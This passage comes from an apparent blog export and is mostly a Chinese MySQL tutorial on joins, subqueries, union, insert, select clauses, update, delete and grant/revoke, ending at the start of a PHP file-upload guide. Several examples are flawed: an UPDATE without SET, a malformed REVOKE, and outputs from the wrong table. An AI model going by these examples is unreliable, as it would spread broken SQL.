sec)\n\n&emsp;\n右连接：包含所有的右边表中的记录甚至是右边表中没有和它匹配的记录。\n\n\n\n\n\n说明\n详解\n\n\n\n\n基本语法\nselect 表1.字段 [as 别名],表n.字段  from 表1 right JOIN 表n on  条件;\n\n\n示例\nselect *  from user right join order_goods  on  user.uid = order_goods.uid;\n\n\n示例说明\n查询商品表中哪些用户购买过商品，并将用户信息显示出来\n\n\n\nmysql> select *  from user right join order_goods  on  user.uid = order_goods.uid;\n+------+-----------+----------+-----+-----+---------------+-----------+\n| uid  | username  | password | oid | uid | name          | buytime   |\n+------+-----------+----------+-----+-----+---------------+-----------+\n|   10 | 高小峰    | 3124qwqw |   1 |  10 | 苹果鼠标      |   1212313 |\n|    3 | 王宝强    | 1235531  |   2 |   3 | iphone 12s    | 123121241 |\n|   12 | 李小超    | 311aqqee |   3 |  12 | 雪碧          |  13232333 |\n|   15 | 佟小刚    | 3cxvdfs  |   4 |  15 |               |  34242123 |\n|    3 | 王宝强    | 1235531  |   5 |   3 | iphone 键盘   |  12123413 |\n+------+-----------+----------+-----+-----+---------------+-----------+\n5 rows in set (0.00 sec)\n\n&emsp;\n9.4 子查询有时候，当我们查询的时候，需要的条件是另外一个select语句的结果，这时就需要使用子查询。用于子查询的关键字包括in、not in、=、!=、exists、not exists等。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段  from 表 where 字段 in(条件)\n\n\n示例1\nselect *  from user where uid in (1,3,4);\n\n\n示例1说明\n按照id 查询指定用户\n\n\n示例2\nselect *  from user where uid in (select uid from order_goods);\n\n\n示例2说明\n将购买过商品的用户信息显示出来\n\n\n\n&emsp;示例1：\nmysql> select *  from user where uid in (1,3,4);\n +-----+-----------+----------+\n | uid | username  | password |\n +-----+-----------+----------+\n |   1 | 景甜      | 123456   |\n |   3 | 王宝强    | 1235531  |\n |   4 | 井柏然    | 123455   |\n +-----+-----------+----------+\n 3 rows in set (0.00 sec)\n\n&emsp;示例2：\nmysql> select *  from user where uid in (select uid from order_goods);\n +-----+-----------+----------+\n | uid | username  | password |\n +-----+-----------+----------+\n |  10 | 高小峰    | 3124qwqw |\n |   3 | 王宝强    | 1235531  |\n |  12 | 李小超    | 311aqqee |\n |  15 | 佟小刚    | 3cxvdfs  |\n +-----+-----------+----------+\n 4 rows in set (0.00 sec)\n\nmysql> select * from emp where deptno in (select deptno from dept);\n\n&emsp;\n9.5 记录联合使用 union 和 union all 关键字，将两个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示。两者主要的区别是把结果直接合并在一起，而 union 是将 union all 后的结果进行一次distinct，去除重复记录后的结果。关键字包括union、union all、distinct等。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect语句1 union[all] select语句2\n\n\n示例\nselect *  from user where uid in (1,3,4);\n\n\n示例说明\n将商品表中的用户信息和用户表中的用户信息的结果组合在一起\n\n\n\nmysql> select uid from user union select uid from order_goods;\n +-----+\n | uid |\n +-----+\n |   1 |\n |   2 |\n |   3 |\n |   4 |\n |   5 |\n |   6 |\n |   7 |\n |   8 |\n |   9 |\n |  10 |\n |  11 |\n |  12 |\n |  13 |\n |  14 |\n |  15 |\n +-----+\n 15 rows in set (0.00 sec)\n\n&emsp;&emsp;\n十. 增删改查之插入记录插入记录有两种个基本语法。\n&emsp;插入基本语法一\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\ninsert into 表 values(值1,值2,值n);\n\n\n示例\nINSERT INTO user values(2,’php中文网’,’男’)\n\n\n示例说明\n向user表中插入值id为2，姓名为李文凯，性别为男\n\n\n\n&emsp;插入基本语法二\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\ninsert into 表(字段1,字段2,字段n) values(值1,值2,值n);\n\n\n示例\nINSERT INTO user(id,username,sex) values(213,’小沈阳’,1);\n\n\n示例说明\n向user表中插入id为213，username为小沈阳，性别为1\n\n\n\n\n基本语法1和基本语法2的区别是：\n\n基本语法1的插入语句，表中有多少个字段就必须要插入多少个值。一个不能多，一个也不能少。若有默认值，不想传，可以写上null。\n基本语法2中，除非有必填字段必须要写入值外。如果有默认值的不想写可以忽略不写。mysql会自动补主默认值。\n基本语法2中，以user(id,username,sex)字段顺序为值的顺序。\n\n\n&emsp;&emsp;&emsp;假设有一张表为user表，我们对字段、字段说明、类型和字段选填和必须状态进行说明，表结构如下：\n\n\n\n字段\nid\nusername\nemail\npassword\nsex\n\n\n\n\n中文说明\n编号\n用户名\n邮箱\n密码\n性别\n\n\n类型说明\nint\nvarchar(50)\nvarchar(60)\nvarchar(32)\ntinyint\n\n\n默认值说明\n自增\n必填\n选填字段，默认值为123@php.cn\n选填字段\n必填字段\n\n\n\n&emsp;按照基本语法一写上表中的插入语句：\nINSERT INTO user values(null,'php中文网','pig@php.cn',null ,1);\n\n\n注意：\n\n可以不指定字段名称，但是 values 后面的顺序应该和表字段的排序一致。\n有默认值的字段可以不写，则为默认值。\n如果有默认值或者可空字段不想传入具体值，可写入null。数据格式必须要与表规定的数据格式一致。\n\n\n&emsp;按照基本语法二写上表中的插入语句：\nINSERT INTO user(username,sex) values('php中文网',1);\n\n\n注意：1. ID为自增的自段可以不用传入值，每插入一次这个字段的值会自动向上加1。2. 有默认值和可为空的字段可不传3. 以表user(username,sex)的插入顺序为准4. 基本语法二为更常用的用法\n\n&emsp;\n基本语法变形：一次插入多条记录\n\nINSERT INTO user(username,password,sex)\n values('胡歌', 'abcdef', 1),\n ( '霍建华', 'bcdeef', 0),\n ( '张靓颖', '123456', 1),\n ('刘诗诗', '987654', 1);\n\n&emsp;&emsp;\n十一. 增删改查之查询记录下面定义了一个表结构，表名为money，表中存放着银行的余额和用户的基本信息。\n[视频教程]\n\n\n&emsp;创建表的语句如下：\nCREATE TABLE money (\n     id INT NOT NULL AUTO_INCREMENT ,\n     username VARCHAR(50) NOT NULL ,\n     balance FLOAT NOT NULL , \n     province VARCHAR(20) NOT NULL , \n     age TINYINT UNSIGNED NOT NULL , \n     sex TINYINT NOT NULL , \n     PRIMARY KEY (id(10))\n     ) ENGINE = InnoDB CHARACTER SET utf8;\n\n&emsp;表结构和数据展示如下：(注：balance是指余额、province是指省份)\n\n\n\nid\nusername\nbalance\nprovince\nage\nsex\n\n\n\n\n1\n王宝强\n120.02\n上海\n29\n1\n\n\n2\n范冰冰\n260.23\n山东\n40\n0\n\n\n3\n黄晓明\n150.86\n山东\n40\n1\n\n\n4\n井柏然\n810\n辽宁\n27\n1\n\n\n5\n李冰冰\n20.15\n黑龙江\n43\n0\n\n\n6\n成龙\n313\n山东\n63\n1\n\n\n7\n杨幂\n123\n北京\n30\n0\n\n\n8\n刘诗诗\n456\n北京\n29\n1\n\n\n9\n柳岩\n23.4\n湖南\n36\n0\n\n\n10\n赵本山\n3456\n辽宁\n63\n1\n\n\n11\n汪峰\n34.32\n北京\n44\n1\n\n\n12\n郭德纲\n212\n天津\n43\n1\n\n\n\n&emsp;\n11.1 基础查询\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect * from 表;\n\n\n示例\nselect * from money;\n\n\n示例说明\n查询money表中所有字段中的所有结果\n\n\n\n\n注：” * ” 是一种正则表达式的写法，表示匹配所有，上面的查询语句和下面的是等价：\n\nmysql> select * from money;\n+----+-----------+---------+-----------+-----+-----+\n| id | username  | balance | province  | age | sex |\n+----+-----------+---------+-----------+-----+-----+\n|  1 | 王宝强    |  120.02 | 湖北      |  29 |   1 |\n|  2 | 范冰冰    |  260.23 | 山东      |  40 |   0 |\n|  3 | 黄晓明    |  150.86 | 山东      |  40 |   1 |\n|  4 | 井柏然    |     810 | 辽宁      |  27 |   1 |\n|  5 | 李冰冰    |   20.15 | 黑龙江    |  43 |   0 |\n|  6 | 成龙      |     313 | 山东      |  63 |   1 |\n|  7 | 杨幂      |     123 | 北京      |  30 |   0 |\n|  8 | 刘诗诗    |     456 | 北京      |  29 |   1 |\n|  9 | 柳岩      |    23.4 | 湖南      |  36 |   0 |\n| 10 | 赵本山    |    3456 | 辽宁      |  63 |   1 |\n| 11 | 汪峰      |   34.32 | 北京      |  44 |   1 |\n| 12 | 郭德纲    |     212 | 天津      |  43 |   1 |\n+----+-----------+---------+-----------+-----+-----+\n12 rows in set (0.00 sec)\n\n&emsp;\n11.2 指定字段查询\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段 from 表;\n\n\n示例\nselect id,username, balance from money;\n\n\n示例说明\n查询money表中id,username, balance字段中的所有结果\n\n\n\nmysql> select id,username, balance from money;\n+----+-----------+---------+\n| id | username  | balance |\n+----+-----------+---------+\n|  1 | 王宝强    |  120.02 |\n|  2 | 范冰冰    |  260.23 |\n|  3 | 黄晓明    |  150.86 |\n|  4 | 井柏然    |     810 |\n|  5 | 李冰冰    |   20.15 |\n|  6 | 成龙      |     313 |\n|  7 | 杨幂      |     123 |\n|  8 | 刘诗诗    |     456 |\n|  9 | 柳岩      |    23.4 |\n| 10 | 赵本山    |    3456 |\n| 11 | 汪峰      |   34.32 |\n| 12 | 郭德纲    |     212 |\n+----+-----------+---------+\n12 rows in set (0.00 sec)\n\n&emsp;\n11.3 查询单个字段不重复记录 distinct\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect distinct 字段 from 表;\n\n\n示例\nselect distinct age deptno from money;\n\n\n示例说明\n查询money表中年龄唯一的所有结果\n\n\n\nmysql> select distinct age deptno from money;\n+--------+\n| deptno |\n+--------+\n|     29 |\n|     40 |\n|     27 |\n|     43 |\n|     63 |\n|     30 |\n|     36 |\n|     44 |\n+--------+\n8 rows in set (0.00 sec)\n\n&emsp;\n11.4 条件查询 where\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect  字段 from 表 where where条件;\n\n\n示例\nselect * from money where age = 29;\n\n\n示例说明\n查询money表中年龄为29的所有结果\n\n\n\nmysql> select * from money where age = 29;\n+----+-----------+---------+----------+-----+-----+\n| id | username  | balance | province | age | sex |\n+----+-----------+---------+----------+-----+-----+\n|  1 | 李文凯    |  120.02 | 湖北     |  29 |   1 |\n|  8 | 刘诗诗    |     456 | 北京     |  29 |   1 |\n+----+-----------+---------+----------+-----+-----+\n2 rows in set (0.00 sec)\n\n&emsp;\nwhere后可接的条件比较运算符比较运算符结果集中将符合条件的记录列出来。上面的例子中，where 后面的田间是一个字段的 ‘=’。除此之外，还可以使用&gt;、&lt;、&gt;=、&lt;=、!=等比较运算符；&emsp;逻辑运算符多个条件还可以使用 or 、 and 等逻辑运算符进行多条件联合查询or   或者and       并且&emsp;我们来看一下多个条件的例子：\n\n\n\n\n\n类别\n详细内容\n\n\n\n\n示例\nselect * from money where id &lt;10 and\n\n\n说明\n查询所有字段 要求id小于10 并且province=’湖北’\n\n\n\n\n\nmysql> select * from money where id &lt;10 and province='湖北';\n +----+-----------+---------+----------+-----+-----+\n | id | username  | balance | province | age | sex |\n +----+-----------+---------+----------+-----+-----+\n |  1 | 王宝强    |  120.02 | 湖北     |  29 |   1 |\n +----+-----------+---------+----------+-----+-----+\n 1 row in set (0.00 sec)\n\n&emsp;\n11.5 结果集排序\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段 from 表 order  by 字段 排序关键词\n\n\n示例\nselect id,username, balance from money order by balance desc;\n\n\n示例说明\n查询money表中的id,username,balance字段，按照余额进行降序排序\n\n\n\n&emsp;排序用到的关键词：\n\n\n\n关键词\n说明\n\n\n\n\nasc\n升序排列，从小到大（默认）\n\n\ndesc\n降序排列，从大到小\n\n\n\n\n在 select 出来之后的结果集中排序使用 order by ，其中 desc 和 asc 是排序顺序中的关键字。desc 表示按照字段进行降序排列，asc 表示升序排列，如果不写关键字默认升序排列。\n\nmysql> select id,username, balance from money order by balance desc;\n+----+-----------+---------+\n| id | username  | balance |\n+----+-----------+---------+\n| 10 | 赵本山    |    3456 |\n|  4 | 井柏然    |     810 |\n|  8 | 刘诗诗    |     456 |\n|  6 | 成龙      |     313 |\n|  2 | 范冰冰    |  260.23 |\n| 12 | 郭德纲    |     212 |\n|  3 | 黄晓明    |  150.86 |\n|  7 | 杨幂      |     123 |\n|  1 | 王宝强    |  120.02 |\n| 11 | 汪峰      |   34.32 |\n|  9 | 柳岩      |    23.4 |\n|  5 | 李冰冰    |   20.15 |\n+----+-----------+---------+\n12 rows in set (0.00 sec)\n\n&emsp;\n11.6 多字段排序order by 后面可以跟多个不同的字段排序，并且排序字段的不同结果集的顺序也不同，如果排序字段的值一样，则值相同的字段按照第二个排序字段进行排序。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段 from 表 order  by 字段1 排序关键词,… …字段n desc\nasc;\n\n\n示例\nselect id,username, balance from money order by balance desc,age asc;\n\n\n示例说明\n查询money表中的id,username,balance字段，按照余额进行降序排序,若余额全都一样，则再使用age进行升序排序\n\n\n\n\n注：如果第一个字段已经将结果给排好。第二个字段排序字段不生效。本例中，第二个字段无效\n\nmysql> select id,username, balance from money order by balance desc,age asc;\n +----+-----------+---------+\n | id | username  | balance |\n +----+-----------+---------+\n | 10 | 赵本山    |    3456 |\n |  4 | 井柏然    |     810 |\n |  8 | 刘诗诗    |     456 |\n |  6 | 成龙      |     313 |\n |  2 | 范冰冰    |  260.23 |\n | 12 | 郭德纲    |     212 |\n |  3 | 黄晓明    |  150.86 |\n |  7 | 杨幂      |     123 |\n |  1 | 王宝强    |  120.02 |\n | 11 | 汪峰      |   34.32 |\n |  9 | 柳岩      |    23.4 |\n |  5 | 李冰冰    |   20.15 |\n +----+-----------+---------+\n 12 rows in set (0.00 sec)\n\n&emsp;\n11.7 结果集限制对于查询或者排序后的结果集，如果希望只显示一部分而不是全部，使用 limit 关键字结果集数量限制。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段 from 表  limit 数量;\n\n\n示例\nselect id,username, balance from money limit 5;\n\n\n示例说明\n显示前五个用户\n\n\n\nmysql>  select * from money limit 5;\n+----+-----------+---------+-----------+-----+-----+\n| id | username  | balance | province  | age | sex |\n+----+-----------+---------+-----------+-----+-----+\n|  1 | 王宝强    |  120.02 | 湖北      |  29 |   1 |\n|  2 | 范冰冰    |  260.23 | 山东      |  40 |   0 |\n|  3 | 黄晓明    |  150.86 | 山东      |  40 |   1 |\n|  4 | 井柏然    |     810 | 辽宁      |  27 |   1 |\n|  5 | 李冰冰    |   20.15 | 黑龙江    |  43 |   0 |\n+----+-----------+---------+-----------+-----+-----+\n5 rows in set (0.00 sec)\n\n&emsp;\n11.8 限制结果集并排序\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段 from 表 order by 字段 关键词 limit 数量\n\n\n示例\nselect id,username, balance from money order by balance desc limit 5;\n\n\n示例说明\n按照钱来排序，显示前五个最有钱的用户\n\n\n\nmysql> select id,username, balance from money order by balance desc limit 5;\n+----+-----------+---------+\n| id | username  | balance |\n+----+-----------+---------+\n| 10 | 赵本山    |    3456 |\n|  4 | 井柏然    |     810 |\n|  8 | 刘诗诗    |     456 |\n|  6 | 成龙      |     313 |\n|  2 | 范冰冰    |  260.23 |\n+----+-----------+---------+\n5 rows in set (0.00 sec)\n\n&emsp;\n11.9 结果集区间选择假设我从第0条开始取了3条记录。又想再从第3条开始取3条记录。再想从第6条开始取4条记录怎么办？这时候就需要使用到结果集区间选择。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 字段 from 表  limit 偏移量,数量\n\n\n示例\nselect id,username, balance from  money limit 0,3;\n\n\n示例说明\n从第一条开始取三条记录\n\n\n\n注：第一条记录为0。\nmysql> select id,username, balance from  money limit 0,3;\n +----+-----------+---------+\n | id | username  | balance |\n +----+-----------+---------+\n |  1 | 王宝强    |  120.02 |\n |  2 | 范冰冰    |  260.23 |\n |  3 | 黄晓明    |  150.86 |\n +----+-----------+---------+\n 3 rows in set (0.00 sec)\n\n&emsp;从第三条开始再取三条呢？\nmysql> select id,username, balance from  money limit 3,3;\n +----+-----------+---------+\n | id | username  | balance |\n +----+-----------+---------+\n |  4 | 井柏然    |     810 |\n |  5 | 李冰冰    |   20.15 |\n |  6 | 成龙      |     313 |\n +----+-----------+---------+\n 3 rows in set (0.00 sec)\n\n\n通过上面的这个思路，显示就完成了分页。每页显示10条记录，那么：第1页为  limit 0,10第2页为  limit 10,10第3页为  limit 20,10依此类推… …\n\n&emsp;\n11.10 统计类函数使用如果我们想知道总用户数怎么办？查询谁是数据表里的首富怎么办？如果我们想知道用户的平均金额怎么办？如果我们想知道所有用户的总金额怎么办？统计类函数最常用的我们有四个：\n\n\n\n函数\n说明\n\n\n\n\nsum\n求和\n\n\ncount\n统计总数\n\n\nmax\n最大值\n\n\nmin\n最小值\n\n\navg\n平均值\n\n\n\n\n注：当然你知道其他的mysql函数也可以使用。不过，在实际工作中，大公司的很多大中型项上很少使用，他们都有专门的计数服务器。因为，mysql的计算量本身很大，为了减少压力通常我们将实际的计算任务交给业务服务器或其他服务器来完成。\n\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect 函数(字段) from 表\n\n\n示例\nselect count(id) from money\n\n\n示例说明\n查询money表的id总数\n\n\n\nmysql> select count(id) from money;\n +-----------+\n | count(id) |\n +-----------+\n |        12 |\n +-----------+\n 1 row in set (0.00 sec)\n\n&emsp;你还可以给字段取别名哟！使用as关键字。\nmysql> select count(id) as zongshu from money;\n +---------+\n | zongshu |\n +---------+\n |      12 |\n +---------+\n 1 row in set (0.00 sec)\n\n&emsp;\n11.11 分组 group by我们拿金额表里面的省份进行分组数据，分组数据后你会发现。有相同的省份会去掉。即，一个省份为一个组。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect * from 表 group by 字段\n\n\n示例\nselect * from money group by province;\n\n\n示例说明\n按照地区进行分组\n\n\n\n统计分组（分类）各总数：\n\nmysql> select deptno, count(1) from emp group by deptno;\n+--------+----------+\n| deptno | count(1) |\n+--------+----------+\n|      1 |        1 |\n|      2 |        5 |\n|      3 |        1 |\n|      5 |        4 |\n+--------+----------+\n4 rows in set (0.04 sec)\n\n统计省份数量后再进行分组显示\nmysql> select count(province),province  from money group by province;\n +-----------------+-----------+\n | count(province) | province  |\n +-----------------+-----------+\n |               3 | 北京      |\n |               1 | 天津      |\n |               3 | 山东      |\n |               1 | 湖北      |\n |               1 | 湖南      |\n |               2 | 辽宁      |\n |               1 | 黑龙江    |\n +-----------------+-----------+\n 7 rows in set (0.00 sec)\n\n&emsp;\n11.12 在分组基础上进行统计with rollup用的很少。这个知识点设置为了解级别。它的主要功能是对于分组的数据进行统计后，再进行一次总数统计。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect * from 表 group by 字段 with rollup\n\n\n示例\nselect count(province),province  from money group by province with rollup;\n\n\n示例说明\n对分组的数再次进行统计\n\n\n\n&emsp;在上面的基础上统计总数，下例结果中，最后多了一个12 NULL。\nmysql> select count(province),province  from money group by province with rollup;\n +-----------------+-----------+\n | count(province) | province  |\n +-----------------+-----------+\n |               3 | 北京      |\n |               1 | 天津      |\n |               3 | 山东      |\n |               1 | 湖北      |\n |               1 | 湖南      |\n |               2 | 辽宁      |\n |               1 | 黑龙江    |\n |              12 | NULL      |\n +-----------------+-----------+\n 8 rows in set (0.00 sec)\n\n&emsp;\n11.13 结果再过滤havinghaving子句与where有相似之处但也有区别,都是设定条件的语句。having 是筛选组 而where是筛选记录。\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nselect * from 表 group by 字段 having 条件\n\n\n示例\nselect count(province) as result ,province  from money group by province having result &gt;2;\n\n\n示例说明\n对地区分组并统计总数，将分组结果中大于2的分组地区显示出来\n\n\n\nmysql> select count(province) as result ,province  from money group by province having result >2;\n +--------+----------+\n | result | province |\n +--------+----------+\n |      3 | 北京     |\n |      3 | 山东     |\n +--------+----------+\n 2 rows in set (0.00 sec)\n\n&emsp;\n11.14 整体使用SQL我们在上面的语句中都是单一使用的某些语句，没有整体使用过。我们现在将语句进行整合后，配合使用一次。整体的SQL语句配合使用的语法结构如下：\nSELECT \n     [字段1 [as 别名1],[函数(字段2) ,]......字段n] \n FROM 表名\n [WHERE where条件]\n [GROUP BY 字段]\n [HAVING where_contition]\n [order 条件]\n [limit 条件]\n\n\n注：上面的语句中可以[] 代表可选。\n\n最终的语法总结如下：\n\n\n\n关键词\n说明\n\n\n\n\nselect\n选择的列\n\n\nfrom\n表\n\n\nwhere\n查询的条件\n\n\ngroup by\n分组属性  having 分组过滤的条件\n\n\norder by\n排序属性\n\n\nlimit\n起始记录位置，取记录的条数\n\n\n\n&emsp;我们进行一次整体的给合使用，查询money表字段：id,username,balance,province 要求id&gt;1 余额大于50，使用地区进行分组。我们使用用户id进行降序，要求只准显示3条。最后将SQL语句写成，查询出来的结果如下：\nmysql> select id,username,balance,province from money where id > 1 and balance > 50 group by province order by id desc limit 3;\n +----+-----------+---------+----------+\n | id | username  | balance | province |\n +----+-----------+---------+----------+\n | 12 | 郭德纲    |     212 | 天津     |\n |  7 | 杨幂      |     123 | 北京     |\n |  4 | 井柏然    |     810 | 辽宁     |\n +----+-----------+---------+----------+\n 3 rows in set (0.00 sec)\n\n&emsp;&emsp;\n十二. 增删改查之更新记录更新数据我们已经说过。需要修改内容，修改银行卡余额，修改装备信息的时候都需要使用到update，修改语句。关键词：update修改(也叫更新)语句的基本语语法如下：\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nupdate 表名 set 字段1=值1,字段2=值2,字段n=值n where 条件\n\n\n示例\nupdate money set  balance=balance-500 where userid = 15;\n\n\n示例说明\n修改money表，将balance余额减500。要求userid为15\n\n\n\n&emsp;假设我们有下面这一个表，表结构如下：\n\n\n\nuserid\nusername\nbalance\n\n\n\n\n1\n王宝强\n50000.00\n\n\n2\n胡歌\n150000000.00\n\n\n15\n马云\n15000.00\n\n\n16\n陈赫\n1234131.00\n\n\n\nmysql> select * from emp where deptno=15;\n+------+----------+----------+\n| userid |username|  balance | \n+------+----------+----------+\n| 15   |  马云    | 15000.00 |\n+------+-------+-------------+\n1 row in set (0.00 sec)\n\n&emsp;\n使用 update 语句进行记录更新\n\n\nmysql>  update money set  balance=balance-500 where userid = 15;\n Query OK, 1 row affected (0.35 sec)\n Rows matched: 1  Changed: 1  Warnings: 0\n\nmysql> select * from emp where deptno=15;\n +------+----------+----------+\n | userid |username|  balance | \n +------+----------+----------+\n | 15   |  马云    | 14500.00 |\n +------+-------+-------------+\n 1 row in set (0.00 sec)\n\n&emsp;\n修改多个字段\n\n\nmysql> update money set  balance=balance-500,username='李文凯' where userid = 15;\n Query OK, 1 row affected (0.00 sec)\n Rows matched: 1  Changed: 1  Warnings: 0\n\nmysql> select * from emp where deptno=15;\n +------+----------+----------+\n | userid |username|  balance | \n +------+----------+----------+\n | 15   |王宝强    | 14500.00 |\n +------+-------+-------------+\n 1 row in set (0.00 sec)\n\n&emsp;\n同时对两个表进行更新\n\n\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nupdate 表1,表2 set 字段1=值1,字段2=值2,字段n=值n where 条件\n\n\n示例\nupdate money m,user u m.balance=m.balance*u.age where m.userid=u.id;\n\n\n示例说明\n修改money，将money表的别名设置为m；user表的别名设置为u；将m表的余额改为m表的balance*用户表的age。执行条件是：m.userid = u.id\n\n\n\nmysql> update money m,user u m.balance=m.balance*u.age where m.userid=u.id;\n\n&emsp;&emsp;\n十三. 增删改查之删除记录使用关键词：delete\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nDELETE FROM 表 [where 条件];\n\n\n示例\nDELETE FROM user where id &gt; 10;\n\n\n示例说明\n删除掉用户表中id大于10的所有用户\n\n\n\n&emsp;user表，表结构如下：\n\n\n\nuserid\nusername\nbalance\n\n\n\n\n1\n王宝强\n50000.00\n\n\n2\n胡歌\n150000000.00\n\n\n15\n马云\n15000.00\n\n\n16\n陈赫\n1234131.00\n\n\n\nmysql> DELETE FROM user where id ＝ 1;\n Query OK, 1 row affected (0.08 sec)\n\n删除掉了id为1的，李文凯这一行的记录\n\n&emsp;\n清空表记录delete和truncate是一样的，但它们有一点不同，那就是DELETE可以返回被删除的记录数，而TRUNCATE TABLE返回的是0。如果一个表中有自增字段，使用truncate table 这个自增字段将起始值恢复成1.\n\n\n\n\n类别\n说明\n\n\n\n\n基本语法\nTRUNCATE TABLE 表名;\n\n\n示例\nTRUNCATE TABLE user;\n\n\n示例说明\n清空表的数据，并且让自增的id从1开始自增\n\n\n\n\n切记：1.删除时一定要记住加上where条件，不然会清空掉整个表的记录。2.删除重要数据前一定要备份、备份、备份。     \n\n&emsp;&emsp;\n十四. 数据控制语言DCL创建库用户(注：可以针对一个用户增加多条权限。)\n添加权限：\n\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\ngrant 权限 on 库.表 to ‘用户‘@’主机’ identified by ‘密码’;\n\n\n示例\ngrant select, insert on test.* to ‘liwenkai‘@’localhost’ identified by ‘4311’;\n\n\n示例说明\n给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限\n\n\n\n&emsp;\n删除权限：\n\n\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nrevoke 权限 on 库.表 from ‘用户‘@’主机’;\n\n\n示例\nrevoke select, insert on test.* to ‘liwenkai‘@’localhost’ identified by ‘4311’;\n\n\n示例说明\n给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限\n\n\n\n&emsp;\n参数说明：\n\n\n\n\n符号\n说明\n\n\n\n\ngrant all\n在grant后接all说明给予所有权限\n\n\nrevoke all\n在revoke后接all说明删除所有权限\n\n\n权限 on .\n. 所明给予所有库所有表的操作权限\n\n\n‘用户‘@’主机’\n主机里面若为%。任意来源的主机均可以使用这个用户来访问\n\n\n\n\n创建数据库用户liwenkai ，具有对test数据库中所有标的select / insert 权限\n\n&emsp;示例：增加权限\nmysql> grant select, insert on test.* to 'liwenkai'@'localhost' identified by '4311';\n Query OK, 0 rows affected (0.00 sec)\n\n&emsp;示例：移除权限\nmysql> revoke insert on test.* from 'liwenkai'@'localhost';\n Query OK, 0 rows affected (0.30 sec)\n\n\n注：上面的一些语句用的较少。你可以将知识点的掌握级别设置为了解级别。更多的时候，权限设置项特别多，人们往往记不住具体的命令。更多 的时候人们使用专门的工具来操作权限。\n\n","thumbnail":"https://i.loli.net/2019/02/24/5c71feef1a980.jpg","plink":"https://Directoree.github.io/post/MySQL-Primer/"},{"title":"PHP-文件上传","date":"2019-02-21T06:10:14.000Z","updated":"2019-02-26T08:25:35.058Z","content":"(。・∀・)ノ\n&ensp;&ensp;\nPHP 文件上传\n\n&emsp;&emsp;\n一. 修改php.ini文件一般情况需要修改：[可以使用ctrl+f 搜索相关配置项。]\n\n\n\n配置项\n功能说明\n\n\n\n\nfile_uploads\non为开启文件上传功能，off为关闭\n\n\npost_max_size\n系统允许的POST传参的最大值\n\n\nupload_max_filesize\n系统允许的上传文件的最大值\n\n\nmemory_limit\n内存使用限制\n\n\nmax_execution_time\n(1)脚本执行时间,参数的单位为秒。(2)这个参数是设定脚本的最大执行时间。(3)也可以根据需求做适当的改变。通常不需要来修改，系统默认值即可。超大文件上传的时候，可能会涉及到这一项参数的修改。(4)上传时间太长了，会超时。如果你将此项参数设为0，则是不限制超时时间，不建议使用。\n\n\n\n\n建议尺寸： file_size(文件大小) &lt; upload_max_filesize &lt; post_max_size &lt; memory_limit\n\n &emsp;&emsp;\n三. is_uploaded_file()函数、数组$_FILES2.1 创建一个文件上传表单请看下面这个供上传文件的 HTML 表单：\n&lt;html>\n&lt;body>\n\n&lt;form action=\"upload_file.php\" method=\"post\"\nenctype=\"multipart/form-data\">\n&lt;label for=\"file\">Filename:&lt;/label>\n&lt;input type=\"file\" name=\"file\" id=\"file\" /> \n&lt;br />\n&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" />\n&lt;/form>\n\n&lt;/body>\n&lt;/html>\n\n&emsp;\n\n请留意如下有关此表单的信息：\n\n&lt;’\\’form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 “multipart/form-data”。\n&lt;’\\’input&gt; 标签的 type=”file” 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。\n\n\n&emsp;\n2.2 is_uploaded_file() 函数[PHP is_uploaded_file() 函数]\n\n\n\n功能：检查指定的文件是否是通过 HTTP POST 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。\n\n语法： is_uploaded_file(file)\n\n\n\n参数\n描述\n\n\n\n\nfile\n必需。规定要检查的文件。\n\n\n\n注意：该函数的结果会被缓存。请使用 clearstatcache() 来清除缓存。\n示例：\n&lt;?php\n$file = \"test.txt\";\nif(is_uploaded_file($file))\n{\necho (\"$file is uploaded via HTTP POST\");\n}\nelse\n{\necho (\"$file is not uploaded via HTTP POST\");\n}\n?>\n\n上面的代码将输出：\n\ntest.txt is not uploaded via HTTP POST\n\n&emsp;\n2.3  $_FILES 数组当客户端上传文件后，我们在action=”xxxx.php”的xxxx.php页面就获得了一个$_FILES 数组 。\n$_FILES 数组内容如下: \n\n\n\n\n数组元素\n描述\n\n\n\n\n$_FILES[“File”][“name”]\n上传文件的名称。 \n\n\n$_FILES[“File”][“type”]\n文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。 \n\n\n$_FILES[“File”][“size”]\n已上传文件的大小，单位为字节。 \n\n\n$_FILES[“File’][“tmp_name”]\n文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv()函数设置是不起作用的。 \n\n\n$_FILES[“File”][“error”]\n和该文件上传相关的错误代码。[“error”] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量或0123467) 